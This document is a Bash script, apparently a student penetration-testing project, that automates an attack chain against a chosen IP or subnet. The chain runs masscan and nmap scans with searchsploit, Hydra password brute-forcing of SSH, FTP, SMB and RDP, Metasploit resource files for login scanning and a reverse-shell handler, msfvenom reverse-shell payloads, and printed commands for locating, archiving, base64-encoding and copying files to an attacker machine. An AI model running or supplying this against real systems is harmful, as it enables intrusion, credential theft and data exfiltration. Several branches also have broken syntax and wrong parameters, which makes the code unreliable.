#!/bin/bash

#IP and CIDR Validation
IP_REGEX='^(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])$'
CIDR_REGEX='^(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])/(3[0-2]|[12]?[0-9])$'

## Reuqest for sudo password at start to automate rest of the script
#Phase 1 - Input and Reconnaissance
echo "Beginning Phase 1 - Input and validaton"
sleep 3
#1.1-User's network input
while true; do
	read -p "Please input a IP/CID you wish to scan: " USER_IP
	
	if [[ "$USER_IP" =~ $IP_REGEX ]]; then #IP Verification
		sleep 2
		echo "Valid IP accepted"
		sleep 1
		break
	elif [[ "$USER_IP" =~ $CIDR_REGEX ]]; then #CIDR Verification
		sleep 2
		echo "Valid CIDR accepted"
		sleep 1
		break
	else read -p "Invalid IP/CIDR rejected. Try again? (Y/N): " USER_C 
		USER_C="${USER_C^^}" #Convert to uppercase
		if [[ "$USER_C" == "N" ]];then
			exit 1
		fi
	fi
done

#1.2-User's output directory (3 ops - Full Path / Direct exist + current location / Direct NOT exist + current location)
read -p "Please input output directory (Name OR Full path) for files,results. and logs: " DIR_NAME

if [[ "$DIR_NAME" == /* ]]; then
	OUTPUT_PATH="$DIR_NAME" #Absolute(Full Path) path
	sleep 1
	OUTPUT_DIR="$(echo "$DIR_NAME" | awk -F/ '{print $NF}')"
	sleep 1
	echo "Directory filepath: $OUTPUT_PATH"
	sleep 2
	echo "Directory identified: $OUTPUT_DIR"
elif [[ -d "$DIR_NAME" ]]; then
	echo "Locating Directory..." #Direct exist + current location
	OUTPUT_DIR="$(realpath "$DIR_NAME")"
	sleep 1
	CURRENTDIR=$(pwd)
	echo $CURRENTDIR
	sleep 1
	echo "Directory identified: $DIR_NAME"
else
	echo "Creating Directory..."
	mkdir -p "$DIR_NAME" #Direct NOT exist + current location
	OUTPUT_DIR="$(realpath $DIR_NAME)"
	sleep 2
	CURRENTDIR=$(pwd)
	echo $CURRENTDIR
	sleep 1
	echo "Directory created and identified: $DIR_NAME"
fi
sleep 3
echo "Phase 1 - Input and Validation completed"
 
#1.3/1.4 User decision (2 ops - Basic / Full)
echo "Beginning Phase 1 - Reconnaissance"
OUTPUT_FILE="scan.txt" #Put the output of the options into this
while true; do
	read -p $'Choose your scan:\n1)Basic Scan\n2)Full Scan\n3)Exit\n' SCANOPS
	SCANOPS="${SCANOPS,,}"
	
	case "$SCANOPS" in
	1|'basic scan') #Basic: scans the network for TCP and UDP, including the service version and weak passwords.
		echo "Beginning Masscan" && sudo masscan -pU:1-65535 $USER_IP --rate 1000 --router-mac 00:0c:29:4f:e0:1f -oG udp.grep  #check UDP ports seprately
		cat udp.grep | awk -F'Ports: ' '/Ports:/ {print $2}' udp.grep| cut -d/ -f1 | sort -n -u > udp_ports.txt #cr AI
		sleep 2
		echo -e "\n========== UCP Scan ==========\n" >> scan.txt
		echo "Beginning UDP scan" && nmap -sU -sV -O -p "$(paste -sd, udp_ports.txt)" $USER_IP -oN scan.txt #Cr AI Scan UDP ports
		sleep 2 
		echo -e "\n========== TCP Scan ==========\n" >> scan.txt
		echo "Beginning TCP scan" && sudo nmap -sV -O -p- $USER_IP --append-output -oN scan.txt #Scan TCP ports
		sleep 2
		break
	;;
	2|'full scan')
		sudo nmap --script-updatedb #Ensure that all database is updated
		sleep 2
		echo "Update completed, proceeding with scan"
		sleep 2
		sudo nmap $USER_IP -p- --min-rate=1000 -Pn -oG discover.grep #Identifer ports that are open on IP adds
		cat discover.grep | grep -oP '\d+/open' |cut -d'/' -f1 | sort -un | paste -sd, > open_port.txt #Store all the ports in readable format
		sleep 2
		#TCP nmap Scan
		if [ ! -s open_port.txt ]; then
			echo "No open port found - aborting deep scan"
			exit 1
		fi
		sleep 2
		echo -e "\n========== TCP Scan ==========\n" >> scan.txt
		echo "Begin full TCP deepscan" && sudo nmap $USER_IP -p $(cat open_port.txt) -sV -sC -O -oN scan.txt -oX msf1.xml #NSE and ports open in different IP
		sleep 3
		#UDP nmap Scan
		echo "Begin UDP Masscan" && sudo masscan -pU:1-65535 $USER_IP --rate 1000 --router-mac 00:0c:29:4f:e0:1f -oG udp.grep  #check UDP ports seprately
		cat udp.grep | awk -F'Ports: ' '/Ports:/ {print $2}' udp.grep| cut -d/ -f1 | sort -n -u > udp_ports.txt #cr AI
		sleep 2
		if [[ ! -s udp_ports.txt ]]; then
			echo "No open UDP ports found - skipping UDP nmap scan"
		else
			echo -e "\n========== UCP Scan ==========\n" >> scan.txt
			echo "Beginning full UDP scan" && nmap -sU -sC -sV -O -p "$(paste -sd, udp_ports.txt)" $USER_IP --append-output -oN scan.txt 
		fi
		#Searchsploit - searchsploit <Keyword>
		echo "Updating searchsploit database"
		sudo searchsploit -u #Told that the updates are weekly-ish
		sleep 2
		if [ ! -s open_port.txt ]; then
			echo "No open port found - Skipping searchsploit"
		else
			echo -e "\n========== Searchsploit ==========\n" >> scan.txt
			searchsploit --nmap msf1.xml >> scan.txt 2>&1
		fi
		break
	;;
	3|'exit')
		echo "Have a nice day"
		exit 0
	;;
	*)
		read -p "Invalid IP/CIDR rejected. Try again? (Y/N): " USER_C 
		USER_C="${USER_C^^}" #Convert to uppercase
		[[ "$USER_C" == "N" ]] && echo "Have a nice day"
		exit 1
	;;
	esac
done
sleep 3
echo "Phase 1 - Reconnaissance completed"
#Phase 2 Attack Pattern
echo "Phase 2: Attack Pattern Choice"
sleep 3
echo -e "Please state your choice.\n1) Test Weak Login Credentials\n2)Metasploit .rc file\n3)Payload Generation"
read -p "Choice Selection(Input Number): " ATT_CHOICE

while true; do
	if [[ "$ATT_CHOICE" == "1" ]]; then
		#Weak password - Hydra
		OPENPORTS=$(cat scan.txt| grep -oP '\d+/tcp' | cut -d/ -f1 | sort -un) # Extract further port number for weak password
		while true; do
			read -p "Select preference 'Default Password' list or 'Custom Password' list. Please provide file path for custom list." USER_CHOICE 
			U_INPUT="${USER_CHOICE,,}" #Ensure whatever entry for default password is entered it can be recognised
			
			if [[ "$U_INPUT" == "default password" ]]; then 
				echo "Hydra in progress. Please be patient"
				echo -e "\n========== Hydra ==========\n" >> scan.txt #Hydra the 4 services from 3.4
				if grep -qx "22" <<< "$OPENPORTS"; then
					hydra -L user.lst -P smaller.txt $USER_IP ssh >> "$OUTPUT_FILE" 2>&1
					echo "Hydra exit code $?"
				fi
				if grep -qx "21" <<< "$OPENPORTS"; then
					hydra -L user.lst -P smaller.txt $USER_IP ftp >> "$OUTPUT_FILE" 2>&1
					echo "Hydra exit code $?"
				fi 
				if grep - qx "445" <<< "$OPENPORTS"; then
					hydra -L user.lst -P smaller.txt $USER_IP smb >> "$OUTPUT_FILE" 2>&1
					echo "Hydra exit code $?"
				fi 
				if grep -qx "3389" <<< "$OPENPORTS"; then
					hydra -L user.lst -P smaller.txt $USER_IP rdp >> "$OUTPUT_FILE" 2>&1
					echo "Hydra exit code $?"
				fi 
				break
			elif [[ "$USER_CHOICE" == /* ]]; then
				if [[ ! -f "$USER_CHOICE" ]]; then #Validate the file path as user error is high probability
					echo "File is not found at: $USER_CHOICE"
					continue
				fi
				echo "Hydra in progress. Please be patient"
				echo -e "\n========== Hydra ==========\n" >> scan.txt
				if grep -qx "22" <<< "$OPENPORTS"; then
					hydra -L user.lst -P $USER_CHOICE $USER_IP ssh >> "$OUTPUT_FILE" 2>&1
					echo "Hydra exit code $?"
				fi
				if grep -qx "21" <<< "$OPENPORTS"; then
					hydra -L user.lst -P $USER_CHOICE $USER_IP ftp >> "$OUTPUT_FILE" 2>&1
					echo "Hydra exit code $?"
				fi 
				if grep -qx "445" <<< "$OPENPORTS"; then
					hydra -L user.lst -P $USER_CHOICE $USER_IP smb >> "$OUTPUT_FILE" 2>&1
					echo "Hydra exit code $?"
				fi 
				if grep -qx "3389" <<< "$OPENPORTS"; then
					hydra -L user.lst -P $USER_CHOICE $USER_IP rdp >> "$OUTPUT_FILE" 2>&1
					echo "Hydra exit code $?"
				fi 
				break
			else read -p "Invalid choice given. Try again? (Y/N): " USER_C 
				USER_C="${USER_C^^}" #Convert to uppercase
				if [[ "$USER_C" == "N" ]];then
					echo " Have a nice day"
					exit 1
				fi
			fi
		done
	elif [[ "$ATT_CHOICE" == "2" ]]; then
		#Create .rc File
		cd "$DIR_NAME" || exit 1
		while true; do
			printf "Which .rc file you would like to generate \n1)SSH Login \n2)Handler \n3)Suggester \n4)Other Modules?" 
			read -p "Choice Selection(Input Number): " RC_CHOICE
			#SSH login component
			if [[ "$RC_CHOICE" == "1" ]]; then
				echo "Creating SSH_Scanner.rc file"
				touch ssh_scanner.rc
				echo "use auxiliary/scanner/ssh/ssh_login" >> ssh_scanner.rc
				echo "set rhosts $USER_IP" >> ssh_scanner.rc
				echo "set Pass_File smaller.txt" >> ssh_scanner.rc
				echo "set Username msfadmin" >> ssh_scanner.rc
				echo "run" >> ssh_scanner.rc
				RC_FILE="ssh_scanner.rc"
			#Handler component
			elif [[ "$RC_CHOICE" == "2" ]]; then
				read -p "Which port number you like to use?: " U_PORT
				echo "Creating Handler.rc file"
				touch handler.rc
				echo "use exploit/multi/handler" >> handler.rc
				echo "set PAYLOAD linux/x86/shell/reverse_tcp" >> handler.rc
				echo "set LHOST $USER_IP" >> handler.rc
				echo "set LPORT $U_PORT" >> handler.rc
				echo "run" >> handler.rc
				RC_FILE="handler.rc"
			#Suggester component
			elif [[ "$RC_CHOICE" == "3" ]]; then
				echo "Creating Suggester.rc file"
				touch suggester.rc
				echo "use post/multi/recon/local_exploit_suggester" >> suggester.rc
				echo "set SESSION $USER_SESSION" >> suggester.rc
				echo "run" >> suggester.rc
				RC_FILE="suggester.rc"
			#Other module component
			elif [[ "$RC_CHOICE" == "4" ]]; then
				touch others.rc
				read -p "Please provide module for use" USER_MOD
				echo "use $USER_MOD" >> others.rc
				echo "set rhosts $USER_IP" >> others.rc
				echo "set Pass_File smaller.txt" >> others.rc
				echo "set Username msfadmin" >> others.rc
				echo "exploit" >> others.rc
			#Invalid component	
			else
				echo "Invalid option, please key in 1,2,3,4"
			fi
			#.rc execution component
			while true; do 
				read -p "Would you like to run your .rc file? (y/n):" SCAN_ACT
				U_OPTION="${SCAN_ACT,,}"
				if [[ $U_OPTION == "y" ]]; then
					while true; do
						read -p "Which .rc file would you like to execute?\n1)SSH Login \n2)Handler \n3)Suggester \n4)Other Modules\n" USER_E
					if [[ $"$RC_CHOICE" == "1" ]]; then
						msfconsole -r ssh_scanner.rc
					elif [[ "$RC_CHOICE" == "2" ]]; then
						msfconsole -r handler.rc
					elif [[ "$RC_CHOICE" == "3" ]]; then
						msfconsole -r suggester.rc
					elif [[ "$RC_CHOICE" == "4" ]]; then
						msfconsole -r others.rc
					else
						echo "Invalid choice given. Please enter either 'y' or 'n'"
					done
				else [[ "$U_OPTION" == "n" ]]; then
					echo " Have a nice day"
					exit 0
				fi
			done
		done
	elif [[ "$ATT_CHOICE" == "3" ]]; then
		#Generate Payload
		read -p "Which directory would you like to store the generated payload? (Please give full filepath)" $DIR_NAME
		cd "$DIR_NAME" || exit 1
		while true; do
			printf "Which OS system would you like to make the payload for?\n1) Linux n2) Windows." 
			read -p "Choice Selection(Input Number): " OS_PAY
			OS_PAY="$(OS_PAY,,)"
			#Linux OS payload
			if [[ "$OS_PAY" == "1" ]]; then
				read -p "Specify the listening port (lport) on your machine:" ATTACKERPORT
				echo "Begin generating payload, please standby"
				msfvenom -p linux/x86/shell/reverse_tcp lhost="$USER_IP" lport=$ATTACKERPORT -f elf -o rev$ATTACKERPORT.elf
			#Windows OS payload
			elif [[  "$OS_PAY" == "2" ]]; then
				read -p "Specify the listening port (lport) on your machine:" ATTACKERPORT
				echo "Begin generating payload, please standby"
				msfvenom -p windows/meterpreter/reverse_tcp lhost="$USER_IP" lport=$ATTACKERPORT -f elf -o rev$ATTACKERPORT.elf
			else
				echo "You have entered an invalid output. Select 1 or 2 please."
			fi
		done
	else
		echo "You have entered an invalid output."
		read -p "Select Attack path: " $ATT_CHOICE
	fi
done
echo "Phase 2 - Attack Pattern completed"
sleep 3
#Data Exfiltration Component
echo "Begin Phase 2- Data Exfiltration"
read -p "Please state the OS you would like to data exfil from?\n1)Linux\n2)Windows" USER_OS

while true; do
	if [[ "$USER_OS" == "1" ]]; then
		echo "Linux Selected."
		sleep 2
		echo "Command suggestion to look for files"
		sleep 2
		echo "Locating files containing keywords and storage"
		echo "find '$DIR_NAME' -type f \( -iname '*password*' -o -iname '*.docx' -o -iname '*.xlsx' \) > locating.txt"
		sleep 2
		echo "Securing directory"
		echo "zip -r archive.zip '$DIR_NAME'"
		sleep 2
		echo"Converting binary data in ASCII text"
		base64 "$DIR_NAME"
		echo "Please run the command in terminal"
		break
	elif [[ "$USER_OS" == "2" ]]; then
		echo "Windows selected."
		sleep 2
		echo "Suggested commands in Windows PowerShell:"
		sleep 2
		echo "Locating files containing keywords and storage"
		echo "'dir /s /b '%DIR_NAME%\*password*'\ndir /s /b '%DIR_NAME%\*.docx'\ndir /s /b '%DIR_NAME%\*.xlsx'' >> Win_cmd.txt"
		sleep 2
		echo "Converting binary data in ASCII text"
		echo "'[Convert]::ToBase64String([IO.File]::ReadAllBytes('file.zip')) | Out-File 'file.zip.b64'' >> Win_cmd.txt"
		sleep 2
		zip -r archive.zip "$DIR_NAME"
		echo "Please run the command contained in the doc in Wins PowerShell"
		break
	else
		echo "You have entered an invalid input. Please select 1 or 2." 
		read -p "Select OS: " $USER_OS
	fi
done
#Data Exfil - SCP command
echo "Generate SCP to attacker machine"
echo "scp  msfadmin@192.168.16.140 $DIR_NAME" 
sleep 3
echo "Phase 2 Data exfiltration completed"
sleep 3

#Log File results
echo "Being Phase 3 - Logging File Results"
echo -e "Summary of task completed. \n1) Target: $USER_IP\n2) File Directory: $DIR_NAMEn\3) Scan choice: $SCANOPS\n4)Attack path: $ATT_CHOICE\n5)OS Type: $USER_OS"
sleep 3
echo "Phase 3 - Logging file results completed"		
